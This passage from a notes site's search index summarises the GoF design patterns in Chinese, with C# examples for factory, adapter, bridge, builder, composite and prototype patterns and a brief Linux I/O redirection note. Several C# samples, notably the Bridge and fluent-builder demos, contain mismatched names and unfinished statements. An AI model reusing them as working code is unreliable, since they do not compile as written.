{
  "0": {
    "title": "23_Design_patterns",
    "content": "創建型模式 . Factory 工廠模式：客戶類和工廠類分開。消費者任何時候需要某種產品，只需向工廠請求即可。消費者無須修改就可以接納新產品。缺點是當產品修改時，工廠類也要做相應的修改。如：如何創建及如何向客戶端提供。 . | Builder 建造模式：將產品的內部表象和產品的生成過程分割開來，從而使一個建造過程生成具有不同的內部表象的產品對象。建造模式使得產品內部表象可以獨立的變化，客戶不必知道產品內部組成的細節。建造模式可以強制實行一種分步驟進行的建造過程。 . | Factory Method 工廠方法模式：核心工廠類不再負責所有產品的創建，而是將具體創建的工作交給子類去做，成為一個抽象工廠角色，僅負責給出具體工廠類必須實現的接口，而不接觸哪一個產品類應當被實例化這種細節。 . | Prototype 原始模型模式：通過給出一個原型對象來指明所要創建的對象的類型，然後用複製這個原型對象的方法創建出更多同類型的對象。原始模型模式允許動態的增加或減少產品類，產品類不需要非得有任何事先確定的等級結構，原始模型模式適用於任何的等級結構。缺點是每一個類都必須配備一個克隆方法。 . | Singleton 單例模式：單例模式確保某一個類只有一個實例，而且自行實例化並向整個系統提供這個實例單例模式。單例模式只應在有真正的”單一實例”的需求時才可使用。 — 結構型模式 . | Adapter 適配器（變壓器）模式：把一個類的接口變換成客戶端所期待的另一種接口，從而使原本因接口原因不匹配而無法一起工作的兩個類能夠一起工作。適配類可以根據參數返還一個合適的實例給客戶端。 . | Bridge 橋樑模式：將抽象化與實現化脫耦，使得二者可以獨立的變化，也就是說將他們之間的強關聯變成弱關聯，也就是指在一個軟件系統的抽象化和實現化之間使用組合/聚合關係而不是繼承關係，從而使兩者可以獨立的變化。 . | Composite 合成模式：合成模式將對象組織到樹結構中，可以用來描述整體與部分的關係。合成模式就是一個處理對象的樹結構的模式。合成模式把部分與整體的關係用樹結構表示出來。合成模式使得客戶端把一個個單獨的成分對象和由他們復合而成的合成對象同等看待。 . | Decorator 裝飾模式：裝飾模式以對客戶端透明的方式擴展對象的功能，是繼承關係的一個替代方案，提供比繼承更多的靈活性。動態給一個對象增加功能，這些功能可以再動態的撤消。增加由一些基本功能的排列組合而產生的非常大量的功能。 . | Facade 門面模式：外部與一個子系統的通信必須通過一個統一的門面對象進行。門面模式提供一個高層次的接口，使得子系統更易於使用。每一個子系統只有一個門面類，而且此門面類只有一個實例，也就是說它是一個單例模式。但整個系統可以有多個門面類。 . | Flyweight 享元模式：FLYWEIGHT在拳擊比賽中指最輕量級。享元模式以共享的方式高效的支持大量的細粒度對象。享元模式能做到共享的關鍵是區分內蘊狀態和外蘊狀態。內蘊狀態存儲在享元內部，不會隨環境的改變而有所不同。外蘊狀態是隨環境的改變而改變的。外蘊狀態不能影響內蘊狀態，它們是相互獨立的。將可以共享的 狀態和不可以共享的狀態從常規類中區分開來，將不可以共享的狀態從類裡剔除出去。客戶端不可以直接創建被共享的對象，而應當使用一個工廠對象負責創建被共享的對象。享元模式大幅度的降低內存中對象的數量。 . | Proxy 代理模式：代理模式給某一個對象提供一個代理對象，並由代理對象控制對源對象的引用。代理就是一個人或一個機構代表另一個人或者一個機構採取行動。某些情況下，客戶不想或者不能夠直接引用一個對象，代理對象可以在客戶和目標對象直接起到中介的作用。客戶端分辨不出代理主題對象與真實主題對象。代理模式可以並 不知道真正的被代理對象，而僅僅持有一個被代理對象的接口，這時候代理對象不能夠創建被代理對象，被代理對象必須有系統的其他角色代為創建並傳入。 — 行為模式 . | CHAIN OF RESPONSIBILITY 責任鏈模式：在責任鏈模式中，很多對象由每一個對象對其下家的引用而接起來形成一條鏈。請求在這個鏈上傳遞，直到鏈上的某一個對象決定處理此請求。客戶並不知道鏈上的哪一個對象最終處理這個請求，系統可以在不影響客戶端的情況下動態的重新組織鏈和分配責任。處理者有兩個選擇：承擔責任或者把責任推給下家。一個請求可以最終不被任何接收端對象所接受。 . | COMMAND 命令模式：命令模式把一個請求或者操作封裝到一個對象中。命令模式把發出命令的責任和執行命令的責任分割開，委派給不同的對象。命令模式允許請求的一方和發送的一方獨立開來，使得請求的一方不必知道接收請求的一方的接口，更不必知道請求是怎麼被接收，以及操作是否執行，何時被執行以及是怎麼被執行的。系統支持命令的撤消。 . | INTERPRETER 解釋器模式：給定一個語言後，解釋器模式可以定義出其文法的一種表示，並同時提供一個解釋器。客戶端可以使用這個解釋器來解釋這個語言中的句子。解釋器模式將描述怎樣在有了一個簡單的文法後，使用模式設計解釋這些語句。在解釋器模式裡面提到的語言是指任何解釋器對象能夠解釋的任何組合。在解釋器模式中需要定 義一個代表文法的命令類的等級結構，也就是一系列的組合規則。每一個命令對象都有一個解釋方法，代表對命令對象的解釋。命令對象的等級結構中的對象的任何排列組合都是一個語言。 . | ITERATOR 迭代子模式：迭代子模式可以順序訪問一個聚集中的元素而不必暴露聚集的內部表象。多個對象聚在一起形成的總體稱之為聚集，聚集對象是能夠包容一組對象的容器對象。迭代子模式將迭代邏輯封裝到一個獨立的子對象中，從而與聚集本身隔開。迭代子模式簡化了聚集的界面。每一個聚集對象都可以有一個或一個以上的迭代子 對象，每一個迭代子的迭代狀態可以是彼此獨立的。迭代算法可以獨立於聚集角色變化。 . | MEDIATOR 調停者模式：調停者模式包裝了一系列對象相互作用的方式，使得這些對象不必相互明顯作用。從而使他們可以鬆散偶合。當某些對象之間的作用發生改變時，不會立即影響其他的一些對象之間的作用。保證這些作用可以彼此獨立的變化。調停者模式將多對多的相互作用轉化為一對多的相互作用。調停者模式將對象的行為和協作 抽象化，把對象在小尺度的行為上與其他對象的相互作用分開處理。 . | MEMENTO 備忘錄模式：備忘錄對象是一個用來存儲另外一個對象內部狀態的快照的對象。備忘錄模式的用意是在不破壞封裝的條件下，將一個對象的狀態捉住，並外部化，存儲起來，從而可以在將來合適的時候把這個對象還原到存儲起來的狀態。 . | OBSERVER— 觀察者模式：觀察者模式定義了一種一隊多的依賴關係，讓多個觀察者對象同時監聽某一個主題對象。這個主題對象在狀態上發生變化時，會通知所有觀察者對象，使他們能夠自動更新自己。 . | STATE— 狀態模式：狀態模式允許一個對象在其內部狀態改變的時候改變行為。 這個對象看上去像是改變了它的類一樣。狀態模式把所研究的對象的行為包裝在不同的狀態對象裡，每一個狀態對象都屬於一個抽象狀態類的一個子類。狀態模式的意圖是讓一個對象在其內部狀態改變的時候，其行為也隨之改變。狀態模式需要對每一個系統可能取得的狀態創立一個狀態類的子類。當系統的狀態變化時，系統便改變所選的子類。 . | STRATEGY 策略模式：策略模式針對一組算法，將每一個算法封裝到具有共同接口的獨立的類中，從而使得它們可以相互替換。策略模式使得算法可以在不影響到客戶端的情況下發生變化。策略模式把行為和環境分開。環境類負責維持和查詢行為類，各種算法在具體的策略類中提供。由於算法和環境獨立開來，算法的增減，修改都不會影響到環境和客戶端。 . | TEMPLATE METHOD— 模板方法模式：模板方法模式準備一個抽象類，將部分邏輯以具體方法以及具體構造子的形式實現，然後聲明一些抽象方法來迫使子類實現剩餘的邏輯。不同的子類可以以不同的方式實現這些抽象方法，從而對剩餘的邏輯有不同的實現。先制定一個頂級邏輯框架，而將邏輯的細節留給具體的子類去實現。 . | VISITOR 訪問者模式：訪問者模式的目的是封裝一些施加於某種數據結構元素之上的操作。一旦這些操作需要修改的話，接受這個操作的數據結構 可以保持不變。訪問者模式適用於數據結構相對未定的系統，它把數據結構和作用於結構上的操作之間的耦合解脫開，使得操作集合可以相對自由的演化。訪問者模式使得增加新的操作變的很容易，就是增加一個新的訪問者類。訪問者模式將有關的行為集中到一個訪問者對象中，而不是分散到一個個的節點類中。當使用訪問者 模式時，要將儘可能多的對象瀏覽邏輯放在訪問者類中，而不是放到它的子類中。訪問者模式可以跨過幾個類的等級結構訪問屬於不同的等級結構的成員類。 |",
    "url": "http://localhost:4000/_notes/docs/design-pattern/23Design_patterns.html",
    "relUrl": "/docs/design-pattern/23Design_patterns.html"
  },
  "1": {
    "title": "",
    "content": "404 . Page not found :( . The requested page could not be found. .",
    "url": "http://localhost:4000/_notes/404.html",
    "relUrl": "/404.html"
  },
  "2": {
    "title": "Abstract Factory",
    "content": "Abstract Factory 模式 . 如果您需要一組可以隨時抽換的元件，並且希望可以簡單地 一次抽換，則可以考慮使用Abstract Factory。 . . AbstractFactory這個名詞是從的建立可抽換的一組 物件角度來看這個模式，如果將焦點放 在使用抽象工廠物件的方法上，因為方法定義了一個樣版流程，流程中真正需要實際物件運作的部份，則呼叫callback物件（工廠物件）來建立，所以從流 程的觀點來看，又稱之為Template-callback模式。 . namespace DotNetDesignPatternDemos.Creational.AbstractFactory { public interface IHotDrink { void Consume(); } internal class Tea : IHotDrink { public void Consume() { Console.WriteLine(&quot;This tea is nice but I&#39;d prefer it with milk.&quot;); } } internal class Coffee : IHotDrink { public void Consume() { Console.WriteLine(&quot;This coffee is delicious!&quot;); } } public interface IHotDrinkFactory { IHotDrink Prepare(int amount); } internal class TeaFactory : IHotDrinkFactory { public IHotDrink Prepare(int amount) { Console.WriteLine($&quot;Put in tea bag, boil water, pour {amount} ml, add lemon, enjoy!&quot;); return new Tea(); } } internal class CoffeeFactory : IHotDrinkFactory { public IHotDrink Prepare(int amount) { Console.WriteLine($&quot;Grind some beans, boil water, pour {amount} ml, add cream and sugar, enjoy!&quot;); return new Coffee(); } } . public class HotDrinkMachine { public enum AvailableDrink // violates open-closed { Coffee, Tea } private Dictionary&lt;AvailableDrink, IHotDrinkFactory&gt; factories = new Dictionary&lt;AvailableDrink, IHotDrinkFactory&gt;(); private List&lt;Tuple&lt;string, IHotDrinkFactory&gt;&gt; namedFactories = new List&lt;Tuple&lt;string, IHotDrinkFactory&gt;&gt;(); public HotDrinkMachine() { foreach (var t in typeof(HotDrinkMachine).Assembly.GetTypes()) { if (typeof(IHotDrinkFactory).IsAssignableFrom(t) &amp;&amp; !t.IsInterface) { namedFactories.Add(Tuple.Create( t.Name.Replace(&quot;Factory&quot;, string.Empty), (IHotDrinkFactory)Activator.CreateInstance(t))); } } } public IHotDrink MakeDrink() { Console.WriteLine(&quot;Available drinks&quot;); for (var index = 0; index &lt; namedFactories.Count; index++) { var tuple = namedFactories[index]; Console.WriteLine($&quot;{index}: {tuple.Item1}&quot;); } while (true) { string s; if ((s = Console.ReadLine()) != null &amp;&amp; int.TryParse(s, out int i) // c# 7 &amp;&amp; i &gt;= 0 &amp;&amp; i &lt; namedFactories.Count) { Console.Write(&quot;Specify amount: &quot;); s = Console.ReadLine(); if (s != null &amp;&amp; int.TryParse(s, out int amount) &amp;&amp; amount &gt; 0) { return namedFactories[i].Item2.Prepare(amount); } } Console.WriteLine(&quot;Incorrect input, try again.&quot;); } } } class Program { static void Main(string[] args) { var machine = new HotDrinkMachine(); IHotDrink drink = machine.MakeDrink(); drink.Consume(); } } } .",
    "url": "http://localhost:4000/_notes/docs/design-pattern/Creational/Abstract_Factory.html",
    "relUrl": "/docs/design-pattern/Creational/Abstract_Factory.html"
  },
  "3": {
    "title": "Adapter",
    "content": "Adapter 模式 . 使用一個中介的Adapter類別來將真正感興趣的事件實作類別，配接至事件處理介面，上面的程式其 UML 圖如下： . using System; using System.Collections.Generic; using System.Collections.ObjectModel; using System.Linq.Expressions; using System.Security.AccessControl; using MoreLinq; using static System.Console; namespace DotNetDesignPatternDemos.Structural.Adapter.NoCaching { public class Point { public int X; public int Y; public Point(int x, int y) { this.X = x; this.Y = y; } public override string ToString() { return $&quot;{nameof(X)}: {X}, {nameof(Y)}: {Y}&quot;; } } public class Line { public Point Start; public Point End; public Line(Point start, Point end) { this.Start = start; this.End = end; } } public class VectorObject : Collection&lt;Line&gt; { } public class VectorRectangle : VectorObject { public VectorRectangle(int x, int y, int width, int height) { Add(new Line(new Point(x,y), new Point(x+width, y) )); Add(new Line(new Point(x+width,y), new Point(x+width, y+height) )); Add(new Line(new Point(x,y), new Point(x, y+height) )); Add(new Line(new Point(x,y+height), new Point(x+width, y+height) )); } } public class LineToPointAdapter : Collection&lt;Point&gt; { private static int count = 0; public LineToPointAdapter(Line line) { WriteLine($&quot;{++count}: Generating points for line [{line.Start.X},{line.Start.Y}]-[{line.End.X},{line.End.Y}] (no caching)&quot;); int left = Math.Min(line.Start.X, line.End.X); int right = Math.Max(line.Start.X, line.End.X); int top = Math.Min(line.Start.Y, line.End.Y); int bottom = Math.Max(line.Start.Y, line.End.Y); int dx = right - left; int dy = line.End.Y - line.Start.Y; if (dx == 0) { for (int y = top; y &lt;= bottom; ++y) { Add(new Point(left, y)); } } else if (dy == 0) { for (int x = left; x &lt;= right; ++x) { Add(new Point(x, top)); } } } } public class Demo { private static readonly List&lt;VectorObject&gt; vectorObjects = new List&lt;VectorObject&gt; { new VectorRectangle(1, 1, 10, 10), new VectorRectangle(3, 3, 6, 6) }; // the interface we have public static void DrawPoint(Point p) { Write(&quot;.&quot;); } static void Main() { Draw(); Draw(); } private static void Draw() { foreach (var vo in vectorObjects) { foreach (var line in vo) { var adapter = new LineToPointAdapter(line); adapter.ForEach(DrawPoint); } } } } } .",
    "url": "http://localhost:4000/_notes/docs/design-pattern/Structural/Adapter.html",
    "relUrl": "/docs/design-pattern/Structural/Adapter.html"
  },
  "4": {
    "title": "Bridge",
    "content": "Bridge模式 . Bridge模式的目的，在於將抽象與實現分離，使兩者都可以獨立地演化。這邊所謂的抽象，指的是指應用程式行為定義的演化，而實現指的是應用程式實作時，所需使用的特定API或平台。 以UML來表示Bridge模式的結構： . . 簡單地說，Bridge模式的重點在於，對Abstraction的實作，不應該依賴於特定API或平台，應 辨識出Implementor，透過Implementor來橋接特定API或平台實現。 . 盡量用組合取代繼承，因為繼承耦合性遠大於組合！ . 將抽象部分與實現部分分離，使它們都可以獨立地變化。–《設計模式》Gof . 橋模式不能只是認為是抽象和實現的分離，它其實並不僅限於此。其實兩個都是抽象的部分，更確切的理解，應該是將一個事物中多個維度的變化分離。 . 每種數據庫都有自己的版本，但是每種數據庫在不同的平台上實現又是不一樣的。比如：微軟的SqlServer數據庫，該數據庫它有2000版本、2005版本、2006版本、2008版本，後面還會有更新的版本。並且這些版本都是運行在Windows操作系統下的，如果要提供Lunix操作系統下的SqlServer怎麼辦呢？如果又要提供IOS操作系統下的SqlServer數據庫該怎麼辦呢？這個情況就可以使用橋接模式，也就是Brige模式。 資料來源 . namespace 橋接模式的實現 2 { 3 /// &lt;summary&gt; 4 /// 該抽像類就是抽象接口的定義，該類型就相當於是Abstraction類型 5 /// &lt;/summary&gt; 6 public abstract class IDatabase 7 { 8 // 通過組合方式引用平台接口，此處就是橋樑，該類型相當於Implementor類型 9 protected PlatformImplementor _implementor; 10 11 // 通過構造器注入，初始化平台實現 12 protected Database(PlatformImplementor implementor) 13 { 14 this . _implementor =implementor; 15 } 16 17 // 創建數據庫--該操作相當於Abstraction類型的Operation方法 18 public abstract void Create(); 19 } 20 21 /// &lt;summary&gt; 22 /// 該抽像類就是實現接口的定義，該類型就相當於是Implementor類型 23 /// &lt;/summary&gt; 24 public abstract class IPlatformImplementor 25 { 26 // 該方法就相當於Implementor類型的OperationImpl方法 27 public abstract void Process(); 28 } 29 30 /// &lt;summary&gt; 31 /// SqlServer2000版本的數據庫，相當於RefinedAbstraction類型 32 /// &lt;/summary&gt; 33 public class SqlServer2000 : IDatabase 34 { 35 // 構造函數初始化 36 public SqlServer2000(IPlatformImplementor implementor) : base (implementor) { } 37 38 public override void Create() 39 { 40 this ._implementor.Process(); 41 } 42 } 43 44 /// &lt;summary&gt; 45 /// SqlServer2005版本的數據庫，相當於RefinedAbstraction類型 46 /// &lt;/summary&gt; 47 public class SqlServer2005 : IDatabase 48 { 49 // 構造函數初始化 50 public SqlServer2005(IPlatformImplementor implementor) : base (implementor) { } 51 52 public override void Create() 53 { 54 this ._implementor.Process(); 55 } 56 } 57 58 /// &lt;summary&gt; 59 /// SqlServer2000版本的數據庫針對Unix操作系統具體的實現，相當於ConcreteImplementorA類型 60 /// &lt;/summary&gt; 61 public class SqlServer2000UnixImplementor : IPlatformImplementor 62 { 63 public override void Process() 64 { 65 Console.WriteLine( &quot; SqlServer2000針對Unix的具體實現&quot; ); 66 } 67 } 68 69 /// &lt;summary&gt; 70 /// SqlServer2005版本的數據庫針對Unix操作系統的具體實現，相當於ConcreteImplementorB類型 71 /// &lt;/summary&gt; 72 public sealed class SqlServer2005UnixImplementor : IPlatformImplementor 73 { 74 public override void Process() 75 { 76 Console.WriteLine( &quot;SqlServer2005針對Unix的具體實現&quot; ); 77 } 78 } 79 80 public class Program 81 { 82 static void Main() 83 { 84 IPlatformImplementor SqlServer2000UnixImp =new SqlServer2000UnixImplementor() 85 // 還可以針對不同平台進行擴展，也就是子類化，這個是獨立變化的 86 87 IDatabase SqlServer2000Unix = new SqlServer2000(SqlServer2000UnixImp); 88 // 數據庫版本也可以進行擴展和升級，也進行獨立的變化。 89 90 // 以上就是兩個維度的變化。 91 92 // 就可以針對Unix執行操作了 93 SqlServer2000Unix.Create(); 94 } 95 } 96 } .",
    "url": "http://localhost:4000/_notes/docs/design-pattern/Structural/Bridge.html",
    "relUrl": "/docs/design-pattern/Structural/Bridge.html"
  },
  "5": {
    "title": "Builder",
    "content": "如果您有個物件必須建立，物件是由個別組件（Component）組合而成，個別組件建立非常複雜，但說明如何運用組件建立非常簡單，您希望將建立複雜組件與運用組件方式分離，則可以使用Builder模式。 . 乍看之下，Builder模式與 Abstract Factory 模式 很類似，其中最主要的差別在於，Abstract Factory模式著重在不同的工廠實作提供不同的一組產品給組件使用，產品之間並不見得有「部份」（Part of）的概念。Builder模式則強調Builder中 所建立的組件，彼此之間有著「部份」（Part of）的概念，並依Director的流程來建立組件與組件之間的關係，也就是說，Builder 組件建立與Director流程指導之間為彼此合作關 係（為強調出兩者關係，或許取名叫Director-Builder模式會更適合）。 . . Builder . namespace DotNetDesignPatternDemos.Creational.Builder { class HtmlElement { public string Name, Text; public List&lt;HtmlElement&gt; Elements = new List&lt;HtmlElement&gt;(); private const int indentSize = 2; public HtmlElement() { } public HtmlElement(string name, string text) { Name = name; Text = text; } private string ToStringImpl(int indent) { var sb = new StringBuilder(); var i = new string(&#39; &#39;, indentSize * indent); sb.Append(string.Format(&quot;{i},&lt;{Name}&gt; n&quot;)); if (!string.IsNullOrWhiteSpace(Text)) { sb.Append(new string(&#39; &#39;, indentSize * (indent + 1))); sb.Append(Text); sb.Append(&quot; n&quot;); } foreach (var e in Elements) sb.Append(e.ToStringImpl(indent + 1)); sb.Append(string.Format(&quot;{i},&lt;{Name}&gt; n&quot;)); return sb.ToString(); } public override string ToString() { return ToStringImpl(0); } } class HtmlBuilder { private readonly string rootName; public HtmlBuilder(string rootName) { this.rootName = rootName; root.Name = rootName; } // not fluent public void AddChild(string childName, string childText) { var e = new HtmlElement(childName, childText); root.Elements.Add(e); } public HtmlBuilder AddChildFluent(string childName, string childText) { var e = new HtmlElement(childName, childText); root.Elements.Add(e); return this; } public override string ToString() { return root.ToString(); } public void Clear() { root = new HtmlElement{Name = rootName}; } HtmlElement root = new HtmlElement(); } public class Demo { static void Main(string[] args) { // if you want to build a simple HTML paragraph using StringBuilder var hello = &quot;hello&quot;; var sb = new StringBuilder(); sb.Append(&quot;&lt;p&gt;&quot;); sb.Append(hello); sb.Append(&quot;&lt;/p&gt;&quot;); Console.WriteLine(sb); // now I want an HTML list with 2 words in it var words = new[] {&quot;hello&quot;, &quot;world&quot;}; sb.Clear(); sb.Append(&quot;&lt;ul&gt;&quot;); foreach (var word in words) { sb.AppendFormat(&quot;&lt;li&gt;{0}&lt;/li&gt;&quot;, word); } sb.Append(&quot;&lt;/ul&gt;&quot;); Console.WriteLine(sb); // ordinary non-fluent builder var builder = new HtmlBuilder(&quot;ul&quot;); builder.AddChild(&quot;li&quot;, &quot;hello&quot;); builder.AddChild(&quot;li&quot;, &quot;world&quot;); Console.WriteLine(builder.ToString()); // fluent builder sb.Clear(); builder.Clear(); // disengage builder from the object it&#39;s building, then... builder.AddChildFluent(&quot;li&quot;, &quot;hello&quot;).AddChildFluent(&quot;li&quot;, &quot;world&quot;); Console.WriteLine(builder); } } } . Fluent Builder . namespace DotNetDesignPatternDemos.Creational.Builder { public class Person { public string Name; public string Position; class Builder : PersonInfoBuilder&lt;Builder&gt; { /* degenerate */ } public override string ToString() { return $&quot;{nameof(Name)}: {Name}, {nameof(Position)}: {Position}&quot;; } } abstract class PersonBuilder&lt;SELF&gt; where SELF : PersonBuilder&lt;SELF&gt; { protected Person person = new Person(); public Person Build() { return person; } } class PersonInfoBuilder&lt;SELF&gt; : PersonBuilder&lt;PersonInfoBuilder&lt;SELF&gt;&gt; where SELF : PersonInfoBuilder&lt;SELF&gt; { public SELF Called(string name) { person.Name = name; return (SELF) this; } } class PersonJobBuilder&lt;SELF&gt; : PersonInfoBuilder&lt;PersonJobBuilder&lt;SELF&gt;&gt; where SELF : PersonJobBuilder&lt;SELF&gt; { public SELF WorksAsA(string position) { person.Position = position; return (SELF) this; } } public class BuilderInheritanceDemo { static void Main(string[] args) { var builder = new Builder(); var person = builder.WorksAsA(&quot;d&quot;). Console.WriteLine(person); } } } . Faceted Builder . namespace DotNetDesignPatternDemos.Creational.BuilderFacets { public class Person { // address public string StreetAddress, Postcode, City; // employment public string CompanyName, Position; public int AnnualIncome; public override string ToString() { return $&quot;{nameof(StreetAddress)}: {StreetAddress}, {nameof(Postcode)}: {Postcode}, {nameof(City)}: {City}, {nameof(CompanyName)}: {CompanyName}, {nameof(Position)}: {Position}, {nameof(AnnualIncome)}: {AnnualIncome}&quot;; } } public class PersonBuilder // facade { // the object we&#39;re going to build protected Person person = new Person(); // this is a reference! public PersonAddressBuilder Lives =&gt; new PersonAddressBuilder(person); public PersonJobBuilder Works =&gt; new PersonJobBuilder(person); public static implicit operator Person(PersonBuilder pb) { return pb.person; } } public class PersonJobBuilder : PersonBuilder { public PersonJobBuilder(Person person) { this.person = person; } public PersonJobBuilder At(string companyName) { person.CompanyName = companyName; return this; } public PersonJobBuilder AsA(string position) { person.Position = position; return this; } public PersonJobBuilder Earning(int annualIncome) { person.AnnualIncome = annualIncome; return this; } } public class PersonAddressBuilder : PersonBuilder { // might not work with a value type! public PersonAddressBuilder(Person person) { this.person = person; } public PersonAddressBuilder At(string streetAddress) { person.StreetAddress = streetAddress; return this; } public PersonAddressBuilder WithPostcode(string postcode) { person.Postcode = postcode; return this; } public PersonAddressBuilder In(string city) { person.City = city; return this; } } public class Demo { static void Main(string[] args) { var pb = new PersonBuilder(); Person person = pb .Lives .At(&quot;123 London Road&quot;) .In(&quot;London&quot;) .WithPostcode(&quot;SW12BC&quot;) .Works .At(&quot;Fabrikam&quot;) .AsA(&quot;Engineer&quot;) .Earning(123000); WriteLine(person); } } } .",
    "url": "http://localhost:4000/_notes/docs/design-pattern/Creational/Builder.html",
    "relUrl": "/docs/design-pattern/Creational/Builder.html"
  },
  "6": {
    "title": "Composite",
    "content": "假設您今天要開發一個動畫編輯程式，動畫由影格（Frame）組成，數個影格組合為動畫清單，動畫清單也可以由其它已完成的動 畫清單組成，也可以在動畫清單與清單之間加入個別影格。 . 無論是影格或動畫清單都可以播放，而動畫清單負責的就是組合影格或動畫清單，所以可以這麼設計： . . 以 UML 來表示Composite模式的結構： . 具有層次性或組合性的物件可以使用Composite模式，像是電路元件、視窗元件等，使用Composite模式可以大大減低這些元件設計的複雜度 . . 範例:將圓形及方形都 » GraphicObject . namespace DotNetDesignPatternDemos.Structural.Composite.GeometricShapes { //base class public class GraphicObject { public virtual string Name { get; set; } = &quot;Group&quot;; public string Color; private Lazy&lt;List&lt;GraphicObject&gt;&gt; children = new Lazy&lt;List&lt;GraphicObject&gt;&gt;(); public List&lt;GraphicObject&gt; Children =&gt; children.Value; private void Print(StringBuilder sb, int depth) { sb.Append(new string(&#39;*&#39;, depth)) .Append(string.IsNullOrWhiteSpace(Color) ? string.Empty : $&quot;{Color} &quot;) .AppendLine($&quot;{Name}&quot;); foreach (var child in Children) child.Print(sb, depth + 1); } public override string ToString() { var sb = new StringBuilder(); Print(sb, 0); return sb.ToString(); } } public class Circle : GraphicObject { public override string Name =&gt; &quot;Circle&quot;; } public class Square : GraphicObject { public override string Name =&gt; &quot;Square&quot;; } public class Demo { static void Main(string[] args) { var drawing = new GraphicObject {Name = &quot;My Drawing&quot;}; drawing.Children.Add(new Square {Color = &quot;Red&quot;}); drawing.Children.Add(new Circle{Color=&quot;Yellow&quot;}); var group = new GraphicObject(); group.Children.Add(new Circle{Color=&quot;Blue&quot;}); group.Children.Add(new Square{Color=&quot;Blue&quot;}); drawing.Children.Add(group); WriteLine(drawing); } } } .",
    "url": "http://localhost:4000/_notes/docs/design-pattern/Structural/Composite.html",
    "relUrl": "/docs/design-pattern/Structural/Composite.html"
  },
  "7": {
    "title": "Creational",
    "content": "設計模式 . Creational 模式 . 如何有效率的產生、管理與操作物件，一直都是值得討論的課題， Creational模式即與物件的建立相關，在這個分類下的模式給出了一些指導原則及設計的方向。 . Builder | Simple Factory 模式 | 抽象工廠 | Abstract Factory 模式 | Factory Method 模式 | Prototype 模式 | Singleton 模式 | Registry of Singleton 模式 | .",
    "url": "http://localhost:4000/_notes/docs/design-pattern/Creational/Creational.html",
    "relUrl": "/docs/design-pattern/Creational/Creational.html"
  },
  "8": {
    "title": "Decorator",
    "content": "文章來源 Decorator Pattern . Decorator的特性是採用組合、而非繼承，實現運行時動態地擴展物件功能的能力，而且可以 根據需要擴展多個功能。避免單獨使用繼承而產生靈活性差和”多子類別衍生問題。但它最根本的作用是在於裝飾。 . 例如開發一個報表功能可能只有顯示和下載的兩個功能， 之後又要加入顯示時先檢查是否有權限、下載前也要檢查權限、權限檢查後，判斷系統日期是否為月底。 所以為了要解決新增功能問題，不要修改原本的程式碼，又可以擴充，Decorator就是符合開發封閉原則，對修改封閉，對擴充開放， 藉以降低系統可能的錯誤風險，使用Decorator模式的組合特性來達到動態擴充相關功能。 . 在某一物件動態加上功能。 一層一層的將功能套上去，每一層執行的是不同的物件。 .",
    "url": "http://localhost:4000/_notes/docs/design-pattern/Structural/Decorator.html",
    "relUrl": "/docs/design-pattern/Structural/Decorator.html"
  },
  "9": {
    "title": "Factories",
    "content": "Simple Factory 模式 . Simple Factory模式又稱Static Factory模式。一個Simple Factory生產成品，而對客戶端隱藏產品產生的細節，物件如何生成，生成前是否與其它物件建立依賴關係，客戶端皆不用理會，用以將物件生成方式之變化 與客戶端程式碼隔離。 . Simple Factory使用靜態方法來簡單地隱藏物件建立細節。撇開靜態方法不談，隱藏物件建立的細節仍是Factory模式的重點，可將這個模式推至極緻，而成為一種通用、專門用來生成物件、建立依賴關係、甚至具備管理物件生命週期職責的輕量級容器。 . using System; namespace DotNetDesignPatternDemos.Creational.Factories { public class Point { private double x, y; protected Point(double x, double y) { this.x = x; this.y = y; } public Point(double a, double b, CoordinateSystem cs = CoordinateSystem.Cartesian) { switch (cs) { case CoordinateSystem.Polar: x = a * Math.Cos(b); y = a * Math.Sin(b); break; default: x = a; y = b; break; } // steps to add a new system // 1. augment CoordinateSystem // 2. change ctor } // factory property public static Point Origin =&gt; new Point(0, 0); // singleton field public static Point Origin2 = new Point(0, 0); // factory method public static Point NewCartesianPoint(double x, double y) { return new Point(x, y); } public static Point NewPolarPoint(double rho, double theta) { return null; } public enum CoordinateSystem { Cartesian, Polar } // make it lazy public static class Factory { public static Point NewCartesianPoint(double x, double y) { return new Point(x, y); } } } class Demo { static void Main(string[] args) { var p1 = new Point(2, 3, Point.CoordinateSystem.Cartesian); var origin = Point.Origin; var p2 = Point.Factory.NewCartesianPoint(1, 2); } } } .",
    "url": "http://localhost:4000/_notes/docs/design-pattern/Creational/Factories.html",
    "relUrl": "/docs/design-pattern/Creational/Factories.html"
  },
  "10": {
    "title": "IO_redirection",
    "content": "I/O Redirection . input/output types . IO Name file descriptor . stdin | 0 | . stdout | 1 | . stderr | 2 | . Redirection . &gt; Redirects standard output to a file. Overwrites (truncating) existing contents. | &gt;&gt; Redirects standard output to a file. Appends to any existing contents. | &lt; Redirects input from a file to a command. | &amp; Used with redirection to signal that a file descriptor is being used. | 2&gt;&amp;1 Combine stderr and standard output. | 2&gt;file Redirect standard error to a file. ls file.txt not-here 2 &gt; out.err | . combine 1 &amp; 2 output ls file.txt not-here &gt; out.both 2 &gt; &amp;1 . The Null Device . &gt; /dev/null Redirect output to nowhere. | .",
    "url": "http://localhost:4000/_notes/docs/linux/IO_redirection.html",
    "relUrl": "/docs/linux/IO_redirection.html"
  },
  "11": {
    "title": "Prototype",
    "content": "Prototype 模式 . 有些物件若以標準的方式建立實例，或者是設定至某個狀態需要複雜的運算及昂貴的資源，則您可以考慮直接以某個物件作為原型，在 需要個別該物件時，複製原型並傳回。 . . using System; using static System.Console; using System.IO; using System.Runtime.Serialization.Formatters.Binary; using System.Xml.Serialization; namespace DotNetDesignPatternDemos.Creational.Prototype { public static class ExtensionMethods { public static T DeepCopy&lt;T&gt;(this T self) { MemoryStream stream = new MemoryStream(); BinaryFormatter formatter = new BinaryFormatter(); formatter.Serialize(stream, self); stream.Seek(0, SeekOrigin.Begin); object copy = formatter.Deserialize(stream); stream.Close(); return (T)copy; } public static T DeepCopyXml&lt;T&gt;(this T self) { using (var ms = new MemoryStream()) { XmlSerializer s = new XmlSerializer(typeof(T)); s.Serialize(ms, self); ms.Position = 0; return (T) s.Deserialize(ms); } } } //[Serializable] // this is, unfortunately, required public class Foo { public uint Stuff; public string Whatever; public override string ToString() { return $&quot;{nameof(Stuff)}: {Stuff}, {nameof(Whatever)}: {Whatever}&quot;; } } public static class CopyThroughSerialization { static void Main() { Foo foo = new Foo {Stuff = 42, Whatever = &quot;abc&quot;}; //Foo foo2 = foo.DeepCopy(); // crashes without [Serializable] Foo foo2 = foo.DeepCopyXml(); foo2.Whatever = &quot;xyz&quot;; WriteLine(foo); 